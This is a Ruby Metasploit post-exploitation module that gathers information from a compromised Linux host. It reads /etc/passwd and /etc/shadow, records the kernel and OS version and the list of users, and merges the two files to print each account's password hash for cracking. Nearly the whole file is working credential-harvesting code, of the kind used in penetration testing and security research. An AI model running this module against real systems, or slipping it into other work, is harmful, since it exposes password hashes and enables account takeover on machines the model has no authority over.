class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Linux Gather System and User Information',
      'Description'   => %q{
        This module gathers the following information: OS Version, Kernel Version, Users, Password Hashes
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Rishi Sangamreddy'
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter']
    ))
  end

  #large portion of code from github post/linux/gather files
  def run
    distro = get_sysinfo
    store_loot(
      "linux.version",
      "text/plain",
      session,
      "Distro: #{distro[:distro]},Version: #{distro[:version]}, Kernel: #{distro[:kernel]}",
      "linux_info.txt",
      "Linux Version")

    passwd_file = read_file("/etc/passwd")
    shadow_file = read_file("/etc/shadow")

    kern = cmd_exec("uname -r")
    osname = cmd_exec("cat /etc/os-release | head -n 2 | tail -n 1")
    osversion = cmd_exec("cat /etc/os-release | head -n 4 | tail -n 1")
    users = cmd_exec("/bin/cat /etc/passwd | cut -d : -f 1")

    print_good("Kernel:")
    print_good("\t{Kernel Version => #{kern}")
    print_good("OS:")
    print_good("\t#{osname}")
    print_good("\t#{osversion}\"")
    print_good("Users:")
    print_good("\t#{users}")

    unshadowfile = unshadow(passwd_file, shadow_file)

    print_good("Username:Password")

    unshadowfile.each_line do |l|
       hash_parts = l.split(':')
       print_good("#{hash_parts[0]}:#{hash_parts[1]}")
    end


  end

  def unshadow(pf,sf)
    unshadowed = ""
    sf.each_line do |sl|
      pass = sl.scan(/^\w*:([^:]*)/).join
      if pass !~ /^\*|^!$/
        user = sl.scan(/(^\w*):/).join
        pf.each_line do |pl|
          if pl.match(/^#{user}:/)
            unshadowed << pl.gsub(/:x:/,":#{pass}:")
          end
        end
      end
    end

    unshadowed
  end

end